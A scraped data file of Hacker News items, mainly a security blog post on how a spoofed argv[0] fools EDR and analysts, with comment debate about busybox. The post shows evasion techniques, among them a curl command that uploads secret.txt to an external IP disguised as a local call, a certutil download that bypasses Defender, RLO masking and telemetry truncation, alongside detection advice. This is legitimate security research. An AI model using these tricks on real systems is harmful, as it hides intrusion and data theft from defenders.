imprisoned for allowing people to watch the television channel al-Manar, which is run by a political party which holds over 10% of the seats in Lebanon's parliament - Hezbollah. reply aftbit 19 hours agorootparentHis name was Javed Iqbal. The charge was \"providing material support to Hizballah\". He plead guilty and was sentenced to 69 months. The government's story was that: \"From approximately 2005 through 2006, IQBAL, through a Brooklyn and Staten Island-based satellite transmission company he helped operate, HDTV Limited, provided satellite transmission services to al-Manar, in exchange for thousands of dollars in payments from al-Manar. IQBAL provided these services knowing that al-Manar is Hizballah's television station.\"[2] It's hard to work out exactly what this means. Another article[4] does some sleuthing and claims that Iqbal had an FCC licensed earth station that was uplinking in the Ku-band to \"ALSAT\". That implies that he was actually repeating the al-Manar broadcasts onto a satellite that had a footprint over the US. The Investigative Project on Terrorism links[5] to some documents for the case, including the original indictment[6]. Some of the \"overt acts\" listed in this indictment included signing a contract in Lebanon in which his company agreed to provide broadcasting services for al-Manar in exchange for a fee. Additionally, he was charged with providing access to these broadcasts to satellite customers. I wonder if he would have gotten in trouble if he had only done the latter - helped consumers to tap into al-Manar without actually being part of the technical broadcast chain. Very interesting case, thanks for the rabbit hole! 1: https://www.nytimes.com/2006/08/25/nyregion/25tv.html 2: https://archives.fbi.gov/archives/newyork/press-releases/200... 3: https://www.justice.gov/archive/usao/nys/pressreleases/Decem... 4: https://www.tvtechnology.com/news/fbi-raids-backyard-interna... 5: https://www.investigativeproject.org/case/190/us-v-iqbal-et-... 6: https://www.investigativeproject.org/case_docs/us-v-iqbal-et... reply nradov 19 hours agorootparentprevThat's not what happened. Javed Iqbal wasn't imprisoned for allowing people to watch Al Manar. He pled guilty to received payments from Al Manar. Hizbollah is a terrorist organization, regardless of their political status in Lebanon. https://www.justice.gov/archive/usao/nys/pressreleases/Decem... reply ignoramceisblis 20 hours agoparentprev--per day. Fined a year's salary per day of use of X/Twitter. reply ClumsyPilot 18 hours agoparentprev> ... how authoritarianism shapes public discourse See I was onboard with this reasoning until last week - we arrested the boss of Telegram and charged him with allowing illicit activity, which obviously happens on WhatsApp and other apps too. Isis was literally recruiting members on western social networks! And we spent months discussing banning of TikTok, my major politicians in mainstream parties. so we aren’t far reply dyauspitr 19 hours agoparentprev [–] Yet there is bipartisan action to ban TikTok in the US. We have effectively banned the import of Chinese electric vehicles. Does that make us authoritarian? reply pino82 18 hours agorootparent [–] I'm always surprised why I constantly see messages downvoted (not only here), just because they feel unconvenient for the bubble?! Imho you should all stop that. It's too simple. It doesn't really increase credibility. Why not start dealing with actual discussions there, and maybe have a little less \"everything was already said; just not yet by everyone\" discussions in other places?! reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Iranian writer Hossein Shanbehzadeh has been sentenced to 12 years in prison for replying with a single dot to a tweet by Iran’s supreme leader, Ayatollah Ali Khamenei.",
      "Shanbehzadeh was charged with pro-Israel propaganda, insulting Islamic sanctities, spreading lies online, and anti-regime propaganda, following his arrest in June 2024.",
      "This case highlights a broader crackdown on dissent in Iran, with Shanbehzadeh's lawyer planning to appeal the verdict."
    ],
    "commentSummary": [
      "An Iranian writer received a 12-year prison sentence for charges including pro-Israel propaganda, insulting Islamic sanctities, spreading lies online, and anti-regime propaganda.",
      "The writer's lawyer intends to appeal, particularly against the pro-Israel accusation, amid claims of contact with Israeli intelligence and an arrest attempt while leaving Iran.",
      "The article highlights media bias and the misleading nature of headlines, which suggested the sentence was solely for tweeting a dot at the supreme leader."
    ],
    "points": 143,
    "commentCount": 147,
    "retryCount": 0,
    "time": 1725315568
  },
  {
    "id": 41434315,
    "title": "Why bother with argv[0]?",
    "originLink": "https://www.wietzebeukema.nl/blog/why-bother-with-argv0",
    "originBody": "Command lines are weird. Windows is known for this [1], but as will become apparent, most operating systems implemented command lines in a way that can cause security issues. This post will set out, section by section, what’s wrong with this widely-adopted convention that the first argument of a process’ command line, often referred to as argv[0], is reserved to represent the process’ name. argv[0] is a relic of the past Whenever a program is started, it is provided with command-line arguments that are accessible from within the program - in fact, it is one of the first pieces of information that is made available when a program starts, and is a key mechanism for altering a program’s execution flow. Consider the exec family of system calls as defined in POSIX [2], which is adopted by Unix-based systems as well as DOS/Win32 [3]. For example, it defines function execv as: int execv(const char *path, char *const argv[]); Calling this function requires the full path of the application to be executed as path and a vector with arguments to be passed to the program as argv; it returns an integer with a status code. The same specification tells us that if a program is successfully executed as a result of this call, it will invoke the targeted program via int main (int argc, char *argv[]); Across all C standards [4] we see that when a program is called like this, the following three conditions should hold true: argc is non-negative; argv[argc] is a null pointer; and if argc is greater than zero, the string pointed to by argv[0] represents the calling program’s name. To some, that final condition may be a surprising one. The new process surely knows its own name, why does it need to be passed as the first process argument by the calling process? It is a design decision made to allow the created process to behave differently based on how it is called. Especially in a POSIX context, in which applications can be and frequently are symlinked, it gives the new process awareness of what the calling process was requesting, regardless of what symbolic links were followed. A practical example of this are the shutdown and reboot programs; on Debian, these are symlinked to the same systemctl executable. Depending on what command you call, the underlying process will behave differently. Although I am not aware of any such real-life examples for Windows, which has much less of a symlink culture, its implementation allows for the same to be possible. This seems like a questionable design decision. Should a program be allowed to behave differently based on its name? From a 2020s standpoint, this seems highly undesirable, as it makes software less predictable and goes against modern design principles. From a 1970s/1980s standpoint, a time when computer resources were scarce, it seems less unreasonable to attempt to minimise any form of duplication and redundancy. Today however, disk space is no longer considered an issue; this is evidenced by macOS Sonoma, where shutdown and reboot are two separate executables. Another argument against this design is that if you have two programs that are so similar that it pays off to consolidate them into a single file, is there really a need for two separate programs/program names? Is using shutdown and reboot so much more preferable than something along the lines of power --shutdown and power --reboot? Some will answer this with a straight “no”, whereas others argue single-word commands enhance user experience, and (especially a few decades ago) can offer cross-platform/backwards syntax compatibility using a shared code base. Even so, whether this solution is the best way of achieving that, remains doubtful. Because even if you were to accept this principle, the implementation itself is debatable too. Why would one provide information on what program name was invoked as part of the process arguments, which are designed to be set by the calling process? Should the new process’s code actually rely on argv[0], it is at the mercy of the process that called it to populate it correctly. Should this not be the case, it may break the new process; similarly, there are examples of programs relying on argv[0] in their process flows in incorrect or unsafe ways [5], leading to security issues. Instead, separating out what is now argv[0] to its own task_struct/PEB feature would appear to be a more solid approach: other “metadata” such as the process’ path, current working directory, etc. are already kept here; it would allow for more consistent tracking and a reduced scope for manipulation. The operating system should be held responsible for populating the value, instead of expecting the calling program to do so. The operating system that comes closest to doing this is, perhaps surprisingly, Windows. Unlike the other mainstream operating systems, Windows’ own API calls for creating new processes (such as CreateProcess [6], ShellExecute [7]) do not allow you to set argv[0]: it sets it for you, based on how the path to the executable was provided. Given how C expects argv to be populated, this is actually the most sensible implementation. Still, because of Windows’ adoption of the POSIX exec calls, there are still ways to manually set argv[0]. As argv[0] usually tells you how the program was called, on Windows it shows you if it was invoked via an absolute path (e.g. 1st highlight) or a relative one (e.g. 3rd highlight); what casing was used (e.g. 2nd highlight is upper case) and if it was wrapped in quotes (4th highlight). argv[0] is ignored (mostly) Regardless of your stance on argv[0], the painted picture is our reality; argv[0] is a concept we will have to live with. As we will see, this does not come without trouble: when making exec calls, the first two of the aforementioned three conditions are taken care of by the implementing operating system; but the final condition concerning argv[0] is not. Since the caller of exec has full control over argv, it is possible to ignore this requirement. Since the operating system nor the calling program nor the called program are expected to check for violations of this requirement, overriding it can be done without consequences. For example, to print Hello, world! with echo, the convention is to call e.g. execv(\"/usr/bin/echo\", [\"echo\", \"Hello, world!\"]). However, executing execv(\"/usr/bin/echo\", [\"oopsie\", \"Hello, world!\"]) will also successfully call the echo program and print Hello, world! to its stdout, despite having argv[0] set to “oopsie”. Most likely, the echo program simply ignores whatever argv[0] is set to and solely focusses on argv[1] and beyond. In fact, this is an approach taken by most programs. Screenshot showing Sysmon [8] output for a ‘normal’ execl() call (left) and one with a manipulated argv[0] (right). Calling an application with a manipulated argv[0] is, as this example shows, easy from within C. Other programming languages as well as some scripting languages also provide accessible interfaces to achieve this: python3 -c \"import os; os.execvp('/path/to/binary', ['ARGV0', '--other', '--args', '--here'])\" perl -e 'exec {\"/path/to/binary\"} \"ARGV0\", \"--other\", \"--args\", \"--here\"' ruby -e \"exec(['/path/to/binary','ARGV0'],'--other', '--args', '--here')\" bash -c 'exec -a \"ARGV0\" /path/to/binary --other --args --here' Thus, a key observation at this point is that manipulating argv[0] is straightforward and has no impact on most program executions. Yet, it has security implications, as we will see in the next three sections. argv[0] can break defences First off, argv[0] can be used to fool security software. When a machine is compromised by a malicious user, it will typically manipulate the system in some way or another by running the attacker’s commands. Often, this takes the form of leveraging system-native commands. Defensive software such as AV and EDR monitor process executions, and detect or prevent specific ones if they are deemed harmful. Most solutions proactively look for commands commonly used by attackers (e.g. 9, 10, 11). For example, the built-in certutil command-line tool on Windows is regularly seen in attacks [12] as a means to download an external payload after gaining an initial foothold. Windows’ pre-installed security software, Microsoft Defender Antivirus [13], prevents certutil executions if it sees command-line arguments that suggest a file download is being attempted. As it turns out, the detection logic used by Defender is flawed: as the screenshot below shows, when starting certutil with argv[0] set to one or more spaces, Defender will not prevent the execution. Using python to emulate a execvp call, a screenshot showing Windows Defender blocking a certutil execution (first attempt), but not if argv[0] is set to a single space (second attempt). Although perhaps not the most exciting of examples, it does highlight a wider issue: some detections rely on the program name being part of the command line. Let’s for argument’s sake pretend Defender’s detection logic here could be represented as command_line.contains('certutil') AND command_line.contains('-urlcache'). You can see how the first condition assumes certutil is part of the command line. Whilst this will be almost always the case for the certutil executions it is trying to find, our example shows a counter-example that successfully bypasses this command-line detection. For this reason, it is strongly recommended to structure detections in a way similar to process_path.endswith('certutil.exe') AND command_line.contains('-urlcache'), as experienced detection engineers are likely to do. Another way in which detections may be bypassed is by adding tuning keywords to argv[0]. It is common for detections to have a base condition that is complemented by additional conditions that filter out false positive alerts. For example, you may have a detection rule that triggers when attrib.exe is used to hide a file [14]. In practice, this happens often legitimately for file desktop.ini, so executions targetting this file may be tuned out [15]. If this is a known exclusion, an attacker could bypass such a detection by including desktop.ini in argv[0], e.g. argv = ['attrib_\\desktop.ini', '+H', 'backdoor.exe']1. argv[0] can deceive Another way in which argv[0] can be exploited, is by manipulating it in such a way that it fools humans. As discussed before, in enterprise settings, security analysts often review alerts generated by security tooling such as EDR software. Most of such alerts will include the process that is responsible for/associated with the activity that was flagged. The process’ command line is a key piece of information that analysts use to determine whether an alert should be further investigated, escalated, or ignored. For example, an alert for possible data exfiltration might be triggered when curl -T secret.txt 123.45.67.89 is executed [16], as it uploads file secret.txt to IP address 123.45.67.89 via HTTP [17]. A trained security analyst may further investigate this alert if this behaviour is rare in the environment. The fact that a hard-coded, external IP is used here might increase suspicion; especially if it was not seen before. With this in mind, attackers are more likely to be successful if they manage to make their activity “blend in” with normal activity, thus staying under the radar. Now consider the same scenario, but with argv[0] changed from curl to curl localhostgrep. This may seem weird, but this is valid: as we have seen, in POSIX, process command lines are an array of strings2, and its first element is nearly always ignored, so we can put in it whatever we want. What’s more, security software often represents the array as a space-separated string. Thus, in this case, it will most likely be represented as curl localhostgrep -T secret.txt 123.45.67.89, despite the arguments that are being passed being ['curl localhostgrep', '-T', 'secret.txt', '123.45.67.89']. Diagram showing how changing argv[0] of a curl command can optically change what command is being executed. To the human eye, it may now appear as if curl localhost is executed, and its output passed to grep -T secret.txt 123.45.67.89. Despite the latter not making much sense as a command, the command now has an entirely different meaning: it gives the impression curl is used to download information from a local address, even though in reality it is used to upload information to a remote address. The first window shows the execution of the spoofed curl command, with a htop window below it showing it was successful. The window on the right represents the external server, showing the contents of secrets.txt were successfully exfiltrated. Another deception example is the use of the infamous Right-To-Left Override (RLO) character [18, 19]. The presence of this Unicode character will tell the rendering application to display the characters that follow in reverse order. Inserting the RLO at the end of argv[0] could therefore make ping moc.elgoog.some-evil-website.com look like ping moc.etisbew-live-emos.google.com. Whilst this will not affect detection logic (since it merely messes with how data is displayed), it may well deceive analysts. Invoking a PowerShell command that downloads and executes BloodHound, with argv[0] containing the RLO character \\u202E, makes it much harder to understand what is going on when looking at the reported command line. argv[0] can corrupt telemetry Finally, there is another way in which argv[0] can raise issues, thanks to the remarkable fact that this often-ignored argument is at the very start of every command line. If you were to stuff argv[0] with enough characters, you will push all other arguments to the very end of the command line. This matters for two reasons: we could once again fool analysts by ‘hiding’ the interesting parts of the command line (hoping they don’t scroll to the very end), but more interestingly, if you make the total command line length long enough, the actually relevant arguments may get truncated by monitoring software. Since Windows 7, the maximum length of a command line on Windows is 14,336 characters [20], which equates to 14 KiB; in the Linux kernel the maximum is hardcoded to 32 page sizes [21] which on 64-bit architecture typically works out as 131,072 characters (128 KiB), whereas macOS Sonoma allows command lines to span up to a whopping 1,048,576 characters (1 MiB). That is a lot of arbitrary space argv[0] could potentially fill up. Process monitoring software like EDR might either log such long command-line executions in full, or it may truncate it at a fixed length to reduce overhead. In case of the former, it is easy to see how someone might generate 1GiB worth of logging data on macOS by simply starting 1,000 processes utilising the maximum command-line length. Should some form of truncation be applied, it will be possible to cut off command-line arguments from the telemetry: a command like perl -e 'exec {\"echo\"} \"_\"x50000, \"Hello, world!\"' will successfully output “Hello, world!”, but telemetry of the execution may just record a bunch of underscores, or in some cases even a completely empty command line. Thus, the relevant command-line arguments are not present, and detection logic as well as analysts will be blind to what is actually going on. Although the echo command executed successfully, the process telemetry ending up in this SQL-based data lake only contains spoofed argv[0] data and no actual command-line arguments, as data is truncated at 32,766 characters. argv[0] considered harmful: prevention and detection All in all, we see that in trying to solve one problem, the concept of argv[0] introduces several other problems. Since argv[0] won’t be going away anytime soon, it is worth focussing on how to deal with this from a security standpoint. Although software developers could validate whether the passed argv[0] has been tampered with by comparing it with its own filename, it is a solution that doesn’t scale well, and as argued before, is something the operating system could do much more reliably. As relying on argv[0] for changing a program’s flow is also highly inadvisable, developers are best off not interacting with it at all. For security professionals, awareness of how argv[0] works and what flaws it introduces is an important step in countering any command-line deception. This post aims to help in this regard. Furthermore, it may be possible to automatically detect some argv[0]-based bypasses. Should your security software provide command-line arguments as an array instead of a space-separated string, it should be possible to reliably identify some of the described patterns. Overly long argv[0] values or ones containing suspicious characters like the pipe character should instantly be flagged as suspicious. Even with command-line arguments presented as a string, it should be possible to flag command lines that do not contain the program’s name, which suggests it has been tampered with. The mere presence of an RLO character in a command line is in most environments a high-efficacy detection. For possibly truncated command-line arguments, make sure you understand how your security solution and data lake handle this and how it affects the generated telemetry; are single event entries capable of holding all command-line data, even when stretched to the maximum? Finally, this post calls for defensive software to improve their detection of argv[0] abuse. Preventing software executions with suspicious argv[0] values should be possible without causing any false positives. EDR platforms should also consider leaving out argv[0] when reporting on command-line arguments, as this will eliminate nearly ever problem highlighted in this post; its forensic value is often minimal to none, or can be more reliably sourced from other process aspects. Ultimately, nobody wants to be bothered by argv[0]. And neither should our software. Because in Windows command lines are represented as strings instead of arrays, adding spaces to argv[0] results in Windows only considering everything up to the first space as argv[0]. That is why for this example we use an underscore. We could however also have used the non-breaking space (\\u00A0) or another Unicode space character to work around this Windows-specific quirk if we wanted to add a space to argv[0]. ↩ As discussed in the previous note, Windows command lines are represented as strings; for POSIX-calls, the operating system turns the provided array into a space-separated string. Windows’ dominance may explain why EDR software commonly represents command lines as a string instead of an array, regardless of operating system. ↩ Posted on 2024-09-03",
    "commentLink": "https://news.ycombinator.com/item?id=41434315",
    "commentBody": "Why bother with argv[0]? (wietzebeukema.nl)140 points by wietze 6 hours agohidepastfavorite158 comments yjftsjthsd-h 4 hours agoSo obviously claiming that there's no good reason for process to read argv[0] is either demonstrating the author's ignorance or needs a much stronger defense; I'd be fascinated to hear how they think busybox should work on an OpenWrt box with a 16MB root filesystem. However, I am willing to consider the discussion about whether there could be merit to restricting the ability to write that value; I could imagine a system that populated it only from the actual file name and did not allow it to be written by the parent process or the child process at runtime. The obvious place this still falls apart is that an attacker could just ln /bin/curl ./some\\ other\\ name but there are sometimes security measures that we use even though they're less than 100% effective so it at least conceivable that this might be a trade off worth making. reply gwbas1c 1 hour agoparentI agree, I think the author really shot themselves in the foot when they, at length, criticized the merits of a program using argv[0]. The real point are the security flaws in a calling program setting argv[0], because it really, really should be set by the operating system. (As a programmer, I shouldn't have to defend against these kinds of attacks. The OS should block it.) The criticisms of valid programming practices, IMO, hurt the author's credibility and distract from the real point of the article. reply pzmarzly 2 hours agoparentprevNot an author, but there's a good alternative. If busybox was edited to ignore argv[2], then applets could be called via shebangs, instead of symlinks: $ echo '#!/path/to/busybox echo' > myecho $ chmod +x myecho $ ./myecho 123 ./myecho 123 Right now this doesn't work properly, because \"./myecho\" (argv[0]) gets placed into argv[2] of the process. Otherwise, this technique IMHO is better than symlinks: - Each applet uses the same amount of disk space (0 blocks, i.e. the content fits into inode). - Doesn't read or write to argv[0]. - You could finally rename the applets. This is not that useful if busybox is your only posix userspace implementation, but very useful if you want many implementations to live side-by-side. E.g. on macOS, I'd like to have readlink point to BSD/macOS's readlink, greadlink to GNU coreutil's, bbreadlink to busybox's. But as I said, this doesn't work for now. The best you can do now is to write shell two-liners https://news.ycombinator.com/item?id=41436012. Some of such two-liners may also fit into the inode inlining limit, so that's a plus. But you will have performance penalty on every call (since sh needs to start up). reply cesarb 37 minutes agorootparent> Each applet uses the same amount of disk space (0 blocks, i.e. the content fits into inode). Is that really the case? AFAIK, OpenWRT uses SquashFS by default, and a quick web search tells me that \"[...] In addition, inode and directory data are highly compacted, and packed on byte boundaries. Each compressed inode is on average 8 bytes in length [...]\" (https://www.kernel.org/doc/html/latest/filesystems/squashfs....). That is, even if the content fits into the inode, it will make the inode use more space (they're variable-size, unlike on traditional filesystems with fixed-size inodes). And using hardlinks (traditionally, we use hardlinks with busybox, not symlinks) goes even further: all commands use a single inode, the only extra space needed is for the directory entry (which you need anyway). reply alerighi 39 minutes agorootparentprevWell that would be inefficient. For each command you run the kernel has to read the file, detect that it has a shebang, parse the shebang line, and then finally load the actual executable in memory. That could be a performance problem, since busybox is used typically in embedded systems that doesn't have a lot of resources: imagine a shell script that runs a command in a loop, it has to do a lot of extra work. Finally, symlinks can be relative, while the solution you proposed is not. This is particularly useful for distributing software, e.g. distributing a tar file with the busybox itself and their symlinks. In fact, you don't even need symlinks at all: you can even have hard links, that could even save disk space on embedded filesystems, that are readonly images anyway. reply vlovich123 11 minutes agorootparentI’m going to challenge you on the performance angle. Instead of doing the shebang line, it has to traverse the filesystem to resolve the link. I suspect that’s probably more expensive than parsing the shebang line. Indeed, a shell script that runs a command in a loop should have busybox detecting the built in command & executing it inline without spawning executables via the file system (this is common in bash as well btw). There are valid reasons but I think the performance angle is the weakest argument to make. reply rzwitserloot 3 hours agoparentprevThat seems unnecessarily harsh. I don't think that's the gist of the article, but the throwaway suggestion of 'just make lots of copies, who cares about diskspace' is insufficient and thus distracts. It's.. a single line about solutions in an article that isn't _about_ solving problems, it's about highlighting a problem exists and that it's worth solving. I read the article more as: There is __often__ no good reason to use argv[0], and it should be avoided if at all possible, and if it cannot be avoided, it would behoove the industry to work on ways to make sure in the future it can be avoidable. For example, why in the blazes does windows taskman.exe list argv[0] in the GUI table view? That's just asking for trouble. Show the actual file path, and always an absolute one - that way you avoid confusion about which executable you're actually running, and it's just as readable if not more readable for every app _except_ those who care about argv[0], e.g. if you ran `/bin/dd` and it's actually busybox, in taskman you'd see `/bin/busybox` instead which'd be worse than seeing 'dd'. That is simple enough to solve (add an API call to update _your own process name_ or at least update your own process 'title' which interfaces like ps/taskman can use accordingly), but, now we're talking about coordinating between OS, glibc, busybox, and so on - lots of parties. I don't mind that the article doesn't delve that deep, as that wasn't the point of it. The point is simply to show the problems the kludge of 'we will show argv[0] instead of the executable name' causes. This article feels more about explaining that in the distant past, a mistake was made with some history as to why that mistake was made and the deleterious practical effects that this mistake is causing or is likely to cause (most of them security related). It's not really about solving the problem; that presumably comes later and should be sketched out by those who are knowledgable on _that_ subject. That doesn't imply the author is ignorant or that the article is insufficiently defended. Just that it hasn't covered all aspects of what it's writing about. reply toast0 2 hours agorootparent> Show the actual file path, and always an absolute one - that way you avoid confusion about which executable you're actually running, and it's just as readable if not more readable for every app _except_ those who care about argv[0], e.g. if you ran `/bin/dd` and it's actually busybox, in taskman you'd see `/bin/busybox` instead which'd be worse than seeing 'dd'. This was kind of in the middle of your complaint about windows, but then you've got unixy busybox discussion. On a unix filesystem, a file that's hard linked with multiple names has no single 'actual name'. All of the names are equally valid. You could show the filesystem and inode number, which should uniquely identify the file, but is pretty user unfriendly. reply wongarsu 6 minutes agorootparent> On a unix filesystem, a file that's hard linked with multiple names has no single 'actual name' The same is true for hard linked files on Windows. That never stops Windows from showing you a path. There is almost always an \"obviously right\" path (the one used when opening the file). And if you lost track of that, deterministically choosing one of the possible paths is almost always more user friendly than just chowing inode numbers. reply pdonis 1 hour agorootparentprev> On a unix filesystem, a file that's hard linked with multiple names has no single 'actual name'. But each of the multiple names points to the same actual data, so it doesn't matter which one is shown. The obvious choice would be to show the absolute path that the OS used to load the executable. reply mbrumlow 3 hours agorootparentprev> highlighting a problem exists Coding bugs into your programs is not a problem it’s a bug. None of the weird arg[0] examples can happen on the shell (without escaping), only when using system calls. The more I read the article the more I feel this is a reaction to a behavior the author did not expect and fancy them as smart therefore the last 20 years of use age of this feature are obviously wrong. reply cesarb 35 minutes agorootparent> None of the weird arg[0] examples can happen on the shell (without escaping), only when using system calls. $ help exec [...] Options: -a name pass NAME as the zeroth argument to COMMAND Even in shell, you can explicitly specify the argv[0] when running an executable. reply ArchOversight 3 hours agorootparentprevThere's the `setproctitle` in FreeBSD that is designed exactly for a process to update the information that is presented to tools such as ps. https://man.freebsd.org/cgi/man.cgi?query=setproctitle&aprop... reply asveikau 2 hours agorootparentThere's also getprogname(3) on a lot of systems, and the __progname variable. I seem to recall this is an area where various Unix like systems have slight variations. reply croes 1 hour agorootparentprevIt's easy to call something a mistake in hindsight. You could argue the mistake was done elsewhere so this feature could be abused. reply ahoka 1 hour agorootparentprev“That is simple enough to solve (add an API call to update _your own process name_ or at least update your own process 'title' which interfaces like ps/taskman can use accordingly)“ We could call it setproctitle, or something. \\s reply wietze 3 hours agoparentprevFor busybox/toybox the argv[0] thing is great, and seems to be the prime example of why argv[0] shouldn't go - yet it is a bit of an anomaly in how argv[0] is used. If there really is a need for having one executable that comprises multiple commands, is `busybox whoami` instead of `whoami` so much more effort? To me, that would make more sense in terms of what is going on; aliases could be used if one-word commands are preferred. In most non busybox contexts, argv[0] is just an unnecessary addition that, as the linked article shows, can introduce weirdness. It's clear from the comments there are still many who think argv[0] is a good thing, which is great - I'm glad the post sparked this debate. reply sltkr 1 hour agorootparent`busybox whoami` is probably fine, but having to write `busybox ls`, `busybox grep`, `busybox cp` etc. would get tedious quickly. Shell aliases don't solve all problems, even if you do: alias rm=\"busybox rm\" alias xargs=\"busybox xargs\" # etc. you still have to write `xargs -exec busybox rm`, because xargs won't use the shell alias. But the main problem with this approach is that POSIX and LSB require certain binaries to be available at certain paths. When they're not, most shell scripts will just break. The minimal standard solution is probably to create shell scripts for all of these, e.g. in /bin/ls: #!/bin/sh exec /bin/busybox ls But this both adds runtime overhead (on every invocation!) and is quite wasteful in terms of disk space. Busybox boasts over 400 tools. At 4 KB per file, that's 1.6 MiB of just shell scripts. Of course that can be less if the file system uses some type of compression which is common on embedded systems where storage space is small, but it still seems to defeat the purpose of using busybox to create a minimal system. reply yjftsjthsd-h 31 minutes agorootparentWell /bin/sh is also busybox, so I think you'd need #!/bin/busybox sh exec /bin/busybox ls ? reply blenderob 3 hours agorootparentprev> is `busybox whoami` instead of `whoami` so much more effort? It's not the \"more effort\" that is the deal breaker here. It is a matter of compliance with specs and user expectations. What you're suggesting would make Busybox very non-POSIXy, very non-Unixy. All scripts written over the last many decades would need to be updated to call `busybox ls` instead of `ls`? How is that a viable solution? > I'm glad the post sparked this debate. This is a very strange way to deflect concerns about quality of the article! reply gary_0 3 hours agorootparentYeah. The whole point of busybox is to provide the POSIX commands in one compact executable. Making things work any other way defeats the entire purpose of busybox. reply mbrumlow 3 hours agorootparentprevYes. Anybody who has shipped software would say. I really don’t think it is a debate. The usage of arg[0] is massively understated by the article. Just go look at gcc or any modern day compiler. Its use so much that the conversion of should we has been hashes out by many different groups yet they still chose to implement it. The security concerns are a non issue. As arg[0] was not the problem. It was the lack of technical knowledge of how systems work and a flaw in the security application. reply alerighi 36 minutes agorootparentprevWell of course it's not only a matter of interactive usage (even because the busybox itself shell could do the conversion). The problem are script, or worse programs that invokes commands as subprocesses (programs that maybe you don't have have access to the source code!). What you do? Replace every single occurrence of each command by prefixing it `busybox`? Not ideal at all... reply hinkley 3 hours agorootparentprevI think you’re both forgetting that bash has been using this trick for decades. Bash has an sh compatibility mode that runs when you invoke it as sh. reply jimrandomh 1 hour agorootparentprevThat's fine for when users are interactively typing commands, but it doesn't work when the command is being run by a non-busybox program which expects commands to exist in the standard locations. reply epcoa 3 hours agorootparentprevhttps://pubs.opengroup.org/onlinepubs/9699919799/ You appear not to realize that busybox is an essential component of a POSIX like system. reply Arch-TK 3 hours agoparentprevRestricting setting it would break login. Not that it couldn't be fixed by changing how we handle login shells but still. Worth remembering. Similarly the busybox situation could be solved by having busybox ship posix shell wrapper scripts which use `#!/bin/busybox sh` as the shebang and simply consist of a line like `exec /bin/busybox ls \"$@\"`. reply nrclark 3 hours agorootparentIt can already do that, afaik. When I last checked, BusyBox supported installations via 4 methods: - symlink - hardlink - shell script wrappers - executable binary wrappers around libbusybox reply zekica 2 hours agorootparentprevYou are over-complicating it, you only need `#!/bin/busybox ls` as the entire contents of the file. reply marcosdumay 3 hours agoparentprevIs there a good reason for allowing writes to argv at all? I think any reason one will find are based on backwards compatibility. reply surajrmal 3 hours agoparentprevYou can write a 2 liner shell script that prepends busybox per command. I've done this on a 16MiB restricted system and while ate maybe 4k per command, it wasn't a big deal with only 20-30 commands. reply blenderob 3 hours agorootparentWhat about compiled binaries that for one reason or another is doing an execve() on \"/usr/bin/cmp\" or some such thing? Do you propose changing every script and every binary on earth that expects Busybox to be a POSIXy, Unixy environment? reply pzmarzly 2 hours agorootparentOn Unixes it doesn't matter if /usr/bin/cmp is a script or a compiled binary. If the script has correct shebang, kernel takes care of executing it. reply oguz-ismail 2 hours agorootparentShebangs are not part of the UNIX specification. What happens if an executable starts with `#!' is implementation-defined. reply sophacles 2 hours agorootparentprevNo you make this script: #!/bin/sh exec /bin/busybox cmp And place it at /usr/bin/cmp reply alerighi 14 minutes agorootparentSo now to execute a program that could have been a direct run you have to fire up a shell, have it parse the file, and execute the instruction? Not really a great thing... Plus, you have to know the absolute path of the executable busybox, not something you always know in advance. reply teddyh 2 hours agorootparentprevSurely you mean #!/bin/sh exec /bin/busybox cmp \"$@\" reply oguz-ismail 2 hours agorootparent`#!/bin/sh' makes this less portable than it could be, if /bin/sh doesn't exists on my system it won't work, for example. Remove that line and it'll work everywhere. reply teddyh 1 hour agorootparentIf /bin/sh does not exist, what in the world is executing the shell script? reply oguz-ismail 1 hour agorootparentThe shell, of course. It just might not be (because it doesn't have to be) located in /bin. reply teddyh 1 hour agorootparentI’m pretty sure that /bin/sh is mandated by POSIX. reply oguz-ismail 1 hour agorootparentIt's not. See https://pubs.opengroup.org/onlinepubs/9799919799/utilities/s... Applications should note that the standard PATH to the shell cannot be assumed to be either /bin/sh or /usr/bin/sh, and should be determined by interrogation of the PATH returned by getconf PATH, ensuring that the returned pathname is an absolute pathname and not a shell built-in. reply zokier 2 hours agoparentprevIsn't the reason for busybox multi-call binary mostly just ELF being bloated? So the answer for resource constrained systems would be to have more efficient executable format. I don't see why multi-call binary + bunch of symlinks would be intrisically much more size-efficient than something purpose-built. reply yuliyp 7 minutes agorootparenta lot of code is shared between different tools. Busybox has one copy of those. Before you mention shared libraries. There is still overhead, as well as complicating the usage (it needs to find a shared lib when starting instead of just having all it needs in the binary). This isn't really a property of the executable format. Any format would have the same problem. reply Hizonner 3 hours agoparentprevAs the original author says (but seems to forget within a paragraph or two), the program should already know what program it is. If you're looking at argv to find out what program you are, you are doing it deeply wrong. It's an argument. One good use for it is to make a guess as to where your executable is installed. Yes, it would be nice if there were a more certain way to get that... but not for security purposes. You don't want to rely on filenames for security anyway, because anybody can make copies and symlinks and rename files at will, and it's really, really hard to catch all the cases of that. Much harder than, for instance, remembering that argv[0] is a hint from your caller, not gospel from the OS. In the same way, I know that it's fashionable nowadays for incompetent idiots to write security tools, but a security tool that trusts an argv value for anything much was obviously written by an incompetent idiot, because that's not what they're for. reply mariusor 3 hours agorootparentAm I missing something, you didn't seem to address the case where you actually need to know which program you are? The way busybox provides the whole suite of linux-utils in one binary and require the command under which it was invoked to know what to do. reply Hizonner 2 hours agorootparentBusybox still knows that it's busybox, and it is using that argument to decide which of its many functions to execute. This person is arguing that that's somehow wrong because busybox, or more importantly some other software that's trying to monitor it, might get confused about whether it's busybox. reply mariusor 2 hours agorootparentBusybox is quite well known project, but frankly from the way you write about it, it does not look like you know how it works so apologies if I'm explaining something that you already know. Busybox is a reimplementation of the standard linux utils (ls, find, dir, etc..) for resource limited machines. To quote from the man page: > BusyBox is a multi-call binary that combines many common Unix > utilities into a single executable. How it works is that it symlinks the binary to each of the commands it implements and then it executes the corresponding functionality based on the value of argv[0]. reply Hizonner 2 hours agorootparentI know exactly how it works, thanks. The hangup here seems to be the definition of \"program\". I'm using it to mean something roughly like \"executable\", which I think is fairly close to what the original article meant it to mean. You seem to be using some concept of \"program\" that makes each of busybox's functions a separate program. As far as I'm concerned, on the other hand, busybox is one big program that does a lot of largely unrelated things, choosing which of them to do based on how it's invoked. There's no right answer. You could say that all of the software running on a whole computer is one giant program, and in fact sometimes I do find it convenient to think of it that way. I don't know that your definition of \"program\" is wrong, but I do think it's alien to this context. reply mariusor 2 hours agorootparentOK, apologies. Then your previous statement makes no sense in context. At least to me. Yes busybox knows it's busybox. But 